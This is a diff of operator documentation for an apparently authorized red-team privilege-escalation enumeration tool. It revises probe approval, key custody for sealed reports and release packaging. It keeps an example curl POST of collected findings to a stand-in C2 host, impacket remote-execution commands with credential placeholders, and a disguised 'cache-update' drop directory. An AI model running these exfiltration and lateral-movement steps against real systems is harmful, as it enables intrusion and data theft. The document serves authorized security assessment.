@@ -36,8 +36,10 @@ the engagement need:
    non-enumerating health check.
 4. Run one enumerate-only baseline. Treat plugin coverage and errors as part of
    the result, not as incidental console output.
-5. Narrow follow-up runs to the approved questions. Enable `--auto-exploit`
-   only after a separate decision to permit reversible write probes.
+5. Narrow follow-up runs to the approved questions. Prefer a triage
+   approve-file that names the exact finding IDs permitted for reversible
+   probes; use blanket `--auto-exploit` only after a separate decision that
+   explicitly permits every supported reversible probe in the selected scope.
 6. Export, transfer, review, and retain evidence according to the engagement
    policy. Capture the sealed-report key separately from the sealed file.
 7. Verify cleanup and record residual artifacts, telemetry, and limitations in
@@ -83,7 +85,7 @@ Use the lowest level that answers the assessment question.
 | --- | --- | --- |
 | 0 — read-only | `enum` with memory output | Normal ROE coverage; preferred baseline |
 | 1 — persistent evidence | Sealed file or approved structured export | Evidence policy, key custody, and retention required |
-| 2 — reversible probe | `enum --auto-exploit` | Explicit ROE approval, maintenance awareness, and a rollback owner |
+| 2 — reversible probe | `triage --approve-file approvals.json`, then the scoped follow-up run | Explicit finding IDs, ROE approval, maintenance awareness, and a rollback owner; blanket `enum --auto-exploit` requires approval for every supported probe in scope |
 
 The `--delay-ms` option changes pacing only; it is not a permission boundary,
 an audit-log control, or a guarantee that host telemetry will be avoided.
@@ -112,7 +114,9 @@ record exactly what was done and why.
 
 1. Confirm written Rules of Engagement (ROE) cover local privilege-escalation enumeration on the target host(s).
 2. Confirm evidence handling: memory-only vs sealed file vs operator-controlled remote.
-3. Prefer **enumerate-only**. Enable `--auto-exploit` only when ROE allows reversible write probes.
+3. Prefer **enumerate-only**. Use finding-scoped triage approval for reversible
+   probes; enable blanket `--auto-exploit` only when the ROE allows every
+   supported probe in the selected scope.
 4. Never run this tool against systems you are not authorized to assess.
 
 Authorization gate (required for the Rust binary):
@@ -286,34 +290,36 @@ failure and remediation in the build log. If you intentionally ship an
 artifact built with a different command or toolchain, record that exception
 and obtain the required approval first.
 
-### 1.6 Package a minimal drop bundle
+### 1.6 Package a full delivery kit
 
-Linux packaging:
-
-```bash
-STAGE=release-staging/stealthy-linux-x86_64
-rm -rf "$STAGE" && mkdir -p "$STAGE/scripts/linux" "$STAGE/docs"
-cp target/release/stealthy "$STAGE/"
-cp scripts/linux/enum.sh scripts/linux/enum.py scripts/linux/enum-posix.sh scripts/linux/enum.pl scripts/linux/run.sh "$STAGE/scripts/linux/"
-cp README.md docs/installation.md docs/user-guide.md docs/operator-runbook.md docs/techniques.md "$STAGE/docs/"
-chmod +x "$STAGE/stealthy" "$STAGE/scripts/linux/"*
-# Keep ./stealthy at the archive root for scripts/install.sh.
-tar -C "$STAGE" -czf stealthy-linux-x86_64.tar.gz .
-sha256sum stealthy-linux-x86_64.tar.gz
-```
-
-Windows packaging (from Linux after cross-build):
+Use the same canonical packager as the tag workflow. It includes the binary,
+platform fallbacks, selected operator docs, `RELEASE-MANIFEST.json`, and
+internal checksums:
 
 ```bash
-STAGE=release-staging/stealthy-windows-x86_64
-rm -rf "$STAGE" && mkdir -p "$STAGE/scripts/windows" "$STAGE/docs"
-cp target/x86_64-pc-windows-gnu/release/stealthy.exe "$STAGE/"
-cp scripts/windows/enum.ps1 scripts/windows/enum.js scripts/windows/EnumTasks.csproj "$STAGE/scripts/windows/"
-cp README.md docs/installation.md docs/user-guide.md docs/operator-runbook.md docs/techniques.md "$STAGE/docs/"
-# Keep ./stealthy.exe at the archive root for scripts/install.ps1.
-(cd "$STAGE" && zip -r ../../stealthy-windows-x86_64.zip .)
-sha256sum stealthy-windows-x86_64.zip
+python3 scripts/release/package.py \
+  --platform linux --arch x86_64 \
+  --target x86_64-unknown-linux-gnu \
+  --binary target/release/stealthy \
+  --output stealthy-linux-x86_64.tar.gz \
+  --version local --commit "$(git rev-parse HEAD)"
 ```
+
+For a local Windows GNU build, the same packager can create a review kit, but
+the published support artifact is Windows x86-64 MSVC:
+
+```bash
+python3 scripts/release/package.py \
+  --platform windows --arch x86_64 \
+  --target x86_64-pc-windows-gnu \
+  --binary target/x86_64-pc-windows-gnu/release/stealthy.exe \
+  --output stealthy-windows-x86_64.zip \
+  --version local --commit "$(git rev-parse HEAD)"
+```
+
+Tagged releases additionally publish SPDX JSON SBOMs, a top-level checksum
+manifest, and GitHub artifact attestations after the full tag gate. See
+[Build](build.md) and the [Support Policy](support-policy.md).
 
 ---
 
@@ -760,11 +766,12 @@ STEALTHY_AUTHORIZED=1 "$BIN" --delay-ms 0 enum   # disable jitter
 
 ```bash
 OUT=/tmp/findings.seal
+KEY_OUT=/approved/keys/findings.key
 STEALTHY_AUTHORIZED=1 "$BIN" --verbose \
-  --output file --output-path "$OUT" \
+  --output file --output-path "$OUT" --key-output-path "$KEY_OUT" \
   enum
-# With --verbose and without -q, the decrypt key is printed to stderr.
-# Capture it into approved secret handling; do not store it beside $OUT.
+# The full key is never printed to stderr. Move KEY_OUT into approved secret
+# handling and do not retain it beside OUT.
 ls -la "$OUT"
 ```
 
@@ -779,17 +786,20 @@ STEALTHY_AUTHORIZED=1 "$BIN" \
 
 ### 3.5 Remote output mode (operator-driven in v1)
 
-v1 does **not** silently POST. It prints a sealed blob and key for the operator to transmit on an approved channel:
+v1 does **not** silently POST. It prints the sealed body for the operator and
+writes the key only to a protected key path:
 
 ```bash
 export STEALTHY_EXFIL_URL='https://c2.example/intake'
-STEALTHY_AUTHORIZED=1 "$BIN" --output remote --exfil-url "$STEALTHY_EXFIL_URL" enum
+STEALTHY_AUTHORIZED=1 "$BIN" --output remote \
+  --exfil-url "$STEALTHY_EXFIL_URL" \
+  --key-output-path /approved/keys/remote.key enum
 ```
 
 Example operator follow-up (only on approved infra):
 
 ```bash
-# After capturing SEALED_B64 and KEY_HEX from tool output:
+# After capturing SEALED_B64 from tool output; retain the protected key file separately:
 curl -fsS -X POST "https://c2.example/intake" \
   -H 'Content-Type: text/plain' \
   --data-binary "$SEALED_B64"
@@ -897,17 +907,18 @@ decrypt it, and losing the key makes the report unrecoverable.
 
 ```bash
 OUT=/approved/evidence/linux-host-a.seal
+KEY_OUT=/approved/keys/linux-host-a.key
 STEALTHY_AUTHORIZED=1 "$BIN" --verbose \
-  --output file --output-path "$OUT" --also-markdown enum \
-  2> /approved/evidence/linux-host-a.run.stderr.txt
+  --output file --output-path "$OUT" --key-output-path "$KEY_OUT" \
+  --also-markdown enum
 ```
 
-With `--verbose` and without `--quiet`, the binary prints the key to stderr.
-Move the key immediately into the approved secret store; do not leave it in a
-shell transcript or beside `$OUT`. Do not use `-q` for this first sealed run,
-because quiet mode suppresses the key message. Verify the file exists, record
-its hash, and confirm that the evidence log points to the key location without
-embedding the key itself:
+The full key is never printed to stderr. Move `$KEY_OUT` immediately into the
+approved secret store and do not leave it beside `$OUT`. Unix output/key files
+use mode `0600`; Windows output/key files remove inherited ACLs and grant full
+control only to the current SID. Verify the file exists, record its hash, and
+confirm that the evidence log points to the key location without embedding the
+key itself:
 
 ```bash
 ls -l "$OUT"
@@ -1282,7 +1293,7 @@ wmiexec.py 'DOMAIN/user:PASSWORD@TARGET' \
 
 # WinRM-based (often quieter than PsExec when WinRM is expected admin traffic)
 atexec.py 'DOMAIN/user:PASSWORD@TARGET' \
-  'cmd.exe /c set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe --output file --output-path C:\Users\Public\Documents\cache-update\findings.seal -q enum'
+  'cmd.exe /c set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe --output file --output-path C:\Users\Public\Documents\cache-update\findings.seal --key-output-path C:\Users\Public\Documents\cache-update\findings.key -q enum'
 ```
 
 #### 4.6.5 Cleanup after PsExec-style runs
@@ -1489,9 +1500,11 @@ $env:STEALTHY_AUTHORIZED = '1'
 ```powershell
 $Bin = 'C:\Users\Public\Documents\cache-update\stealthy.exe'
 $env:STEALTHY_AUTHORIZED = '1'
-# Use --verbose without -q so the key is emitted to stderr for approved
-# secret handling; do not leave it in a target transcript.
-& $Bin --verbose --output file --output-path 'C:\Users\Public\Documents\cache-update\findings.seal' enum
+# The full key is never emitted to stderr. The protected key file removes
+# inherited ACLs and grants full control only to the current SID.
+& $Bin --verbose --output file `
+  --output-path 'C:\Users\Public\Documents\cache-update\findings.seal' `
+  --key-output-path 'C:\Users\Public\Documents\cache-update\findings.key' enum
 & $Bin --output file --output-path 'C:\Users\Public\Documents\cache-update\findings.json' --plaintext-file enum
 ```
 
@@ -1568,25 +1581,25 @@ exit `4` is a finding gate, not necessarily a tool failure. Inspect the JSON
 
 ### 5.8 Windows sealed output and key handling
 
-The same key-custody rule applies on Windows: capture the key from the
-non-quiet verbose run, place it in the approved secret store, and keep it out
-of the target drop directory and ordinary PowerShell history.
+The same key-custody rule applies on Windows: write the key to a distinct
+protected path, place it in the approved secret store, and remove the target
+copy after transfer. The full key is never printed to stderr.
 
 ```powershell
 $Bin = 'C:\Users\Public\Documents\cache-update\stealthy.exe'
 $Out = 'C:\Users\Public\Documents\cache-update\findings.seal'
+$KeyOut = 'C:\Users\Public\Documents\cache-update\findings.key'
 $env:STEALTHY_AUTHORIZED = '1'
-& $Bin --verbose --output file --output-path $Out --also-markdown enum `
-  2> 'C:\Users\Public\Documents\cache-update\run.stderr.txt'
+& $Bin --verbose --output file --output-path $Out `
+  --key-output-path $KeyOut --also-markdown enum
 
 Get-Item $Out | Select-Object FullName, Length, LastWriteTime
 Get-FileHash $Out -Algorithm SHA256
 ```
 
-If the key was printed into a transcript, treat that transcript as sensitive
-evidence and move it under the same access policy as the report. Do not assume
-that deleting the transcript from the target removes copies held by the
-terminal host, remoting client, or logging infrastructure.
+The tool removes inherited ACL entries and grants full control only to the
+current SID. Still move `$KeyOut` to the approved secret store promptly and
+confirm the target copy was removed after transfer.
 
 ### 5.9 Windows run review checklist
 
@@ -1619,12 +1632,11 @@ RUN_UTC=$(date -u +%Y%m%dT%H%M%SZ)
 cargo build -p stealthy --release
 ssh "$TARGET" "mkdir -p $REMOTE"
 scp target/release/stealthy "$TARGET:$REMOTE/stealthy"
-ssh "$TARGET" "chmod +x $REMOTE/stealthy && STEALTHY_AUTHORIZED=1 $REMOTE/stealthy --verbose --output file --output-path $REMOTE/findings.seal enum" \
-  2> "linux-${RUN_UTC}.run.stderr.txt"
+ssh "$TARGET" "chmod +x $REMOTE/stealthy && STEALTHY_AUTHORIZED=1 $REMOTE/stealthy --verbose --output file --output-path $REMOTE/findings.seal --key-output-path $REMOTE/findings.key enum"
 scp "$TARGET:$REMOTE/findings.seal" ./findings-$(date +%Y%m%d%H%M%S).seal
-# Move the key from the stderr file into the approved secret store before
-# sharing, archiving, or deleting that file.
-ssh "$TARGET" "rm -f $REMOTE/stealthy $REMOTE/findings.seal"
+scp "$TARGET:$REMOTE/findings.key" "/approved/keys/linux-${RUN_UTC}.key"
+# Move the key into the approved secret store before sharing or archiving.
+ssh "$TARGET" "rm -f $REMOTE/stealthy $REMOTE/findings.seal $REMOTE/findings.key"
 ```
 
 ### 6.2 Windows: cross-build, SCP, enum, pull sealed results
@@ -1638,12 +1650,11 @@ rustup target add x86_64-pc-windows-gnu
 cargo build -p stealthy --release --target x86_64-pc-windows-gnu
 ssh "$TARGET" "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path 'C:\\Users\\Public\\Documents\\cache-update' | Out-Null\""
 scp target/x86_64-pc-windows-gnu/release/stealthy.exe "$TARGET:$REMOTE/stealthy.exe"
-ssh "$TARGET" 'set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe --verbose --output file --output-path C:\Users\Public\Documents\cache-update\findings.seal enum' \
-  2> "windows-${RUN_UTC}.run.stderr.txt"
+ssh "$TARGET" 'set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe --verbose --output file --output-path C:\Users\Public\Documents\cache-update\findings.seal --key-output-path C:\Users\Public\Documents\cache-update\findings.key enum'
 scp "$TARGET:$REMOTE/findings.seal" ./findings-win-$(date +%Y%m%d%H%M%S).seal
-# Move the key from the stderr file into the approved secret store before
-# sharing, archiving, or deleting that file.
-ssh "$TARGET" 'del /f /q C:\Users\Public\Documents\cache-update\stealthy.exe C:\Users\Public\Documents\cache-update\findings.seal'
+scp "$TARGET:$REMOTE/findings.key" "/approved/keys/windows-${RUN_UTC}.key"
+# Move the key into the approved secret store before sharing or archiving.
+ssh "$TARGET" 'del /f /q C:\Users\Public\Documents\cache-update\stealthy.exe C:\Users\Public\Documents\cache-update\findings.seal C:\Users\Public\Documents\cache-update\findings.key'
 ```
 
 ### 6.3 Linux script-only one-shot over SSH
@@ -1775,14 +1786,20 @@ does not require the authorization gate.
 ```bash
 OPERATOR_BIN=./target/release/stealthy
 SEALED=./approved-evidence/linux-host-a.seal
+KEY_FILE=/approved/keys/linux-host-a.key
 
-# Supply KEY_HEX from the approved secret store; do not put a literal key in
-# shell history. The resulting JSON is plaintext sensitive evidence.
-"$OPERATOR_BIN" report "$SEALED" --key-hex "$KEY_HEX" --format json \
+# Prefer the protected key file from the approved secret store. The resulting
+# JSON is plaintext sensitive evidence.
+"$OPERATOR_BIN" report "$SEALED" --key-file "$KEY_FILE" --format json \
   > ./approved-evidence/linux-host-a.json
-"$OPERATOR_BIN" report "$SEALED" --key-hex "$KEY_HEX" --format markdown \
+"$OPERATOR_BIN" report "$SEALED" --key-file "$KEY_FILE" --format markdown \
   > ./approved-evidence/linux-host-a.review.md
 ```
+
+`STEALTHY_KEY_FILE` can provide the same path. `STEALTHY_KEY_HEX` is the
+environment-only compatibility value when a protected file is impractical.
+Avoid `--key-hex`: it remains accepted for compatibility, but command-line
+values may be captured by shell history or process inspection.
 
 Validate that the decoded report's run ID, host, identity, mode, and plugin
 coverage match the engagement log. Hash the sealed source and decoded outputs,
@@ -1851,7 +1868,7 @@ name or directory. Resolve the exact artifact against the run log first.
 | --- | --- |
 | `windows.privileges` | Token privileges + Potato-family recommendation |
 | `windows.services` | Unquoted / writable services + parent plant dirs |
-| `windows.scheduled_tasks` | Task XML + writable action binaries |
+| `windows.scheduled_tasks` | Task/action-file ACLs plus registry-backed task-object `WRITE_DAC`, `WRITE_OWNER`, and `DELETE` rights |
 | `windows.always_install_elevated` | Installer policy |
 | `windows.uac` | UAC policy values |
 | `windows.dll_hijack` | Search-path writability |
@@ -1881,7 +1898,7 @@ or AV/EDR (see `docs/techniques.md`).
 | `permission denied` running binary | No execute bit / mount `noexec` | `chmod +x` or run from executable mount; else use scripts |
 | Windows SmartScreen / AppLocker block | Custom `.exe` blocked | Use `enum.ps1` / `enum.js` / approved LOLBIN host |
 | `sudo -l` noisy / audited | Expected | Prefer `--profile quiet` (skips sudo helpers) or readable sudoers paths |
-| Sealed file present, lost key | Cannot decrypt | Re-run with key capture; treat as sensitive credential |
+| Sealed file present, lost key | Cannot decrypt | If authorized, re-run with `--key-output-path` or `STEALTHY_KEY_OUTPUT_PATH`; protect the new key file as a sensitive credential |
 
 ---
 
@@ -1933,8 +1950,9 @@ not overwrite the original evidence with a later clean run.
 Call out limitations explicitly in the deliverable:
 
 - A skipped plugin or plugin error reduces coverage.
-- Script-only fallbacks do not provide the same plugin set or report schema as
-  the Rust binary.
+- Script-only fallbacks emit reduced-coverage schema v2, but do not provide the
+  native binary's plugin coverage or evidence depth. Preserve and inspect
+  `coverage_mode`, coverage arrays, and `capability_delta`.
 - A filtered report shows only findings at or above the selected threshold.
 - Running as root/SYSTEM is not equivalent to a standard-user assessment.
 - A recommendation or kernel-version hint is not a kernel exploit result.
@@ -1945,7 +1963,8 @@ Call out limitations explicitly in the deliverable:
 
 1. Start with `-q enum` and memory output.
 2. Keep `--delay-ms` at default (`50`) or higher on monitored hosts.
-3. Avoid `--auto-exploit` until findings justify a reversible probe.
+3. Avoid reversible probes until findings justify them; prefer exact
+   finding-scoped triage approval over blanket `--auto-exploit`.
 4. Prefer sealed `--output file` over `--plaintext-file`.
 5. Delete drop paths when the check-in ends.
 6. Do not open outbound exfil unless the C2 URL is explicitly in ROE.
